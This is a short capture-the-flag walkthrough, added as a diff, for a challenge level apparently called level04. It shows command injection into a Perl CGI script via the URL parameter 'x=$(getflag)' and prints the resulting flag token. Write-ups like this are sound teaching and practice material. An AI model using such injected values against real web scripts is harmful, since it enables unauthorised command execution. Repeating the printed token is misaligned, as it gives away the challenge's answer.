@@ -1,0 +1,11 @@
+#level04 file is a perl script
+#to see the content, there is comment localhost:4747, this is probably a web page
+ cat level04.pl
+#Lets try to open this page with browser, for that we need VM's ip
+ ifconfig
+#then get the inet ip and go to your browser
+ http://192.168.56.101:4747/level04.pl
+# We saw that it print the x value, let's then set x with post method and make it execute the getflag command
+ http://192.168.56.101:4747/level04.pl?method=post&x=$(getflag)
+# This will print you the token
+# Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
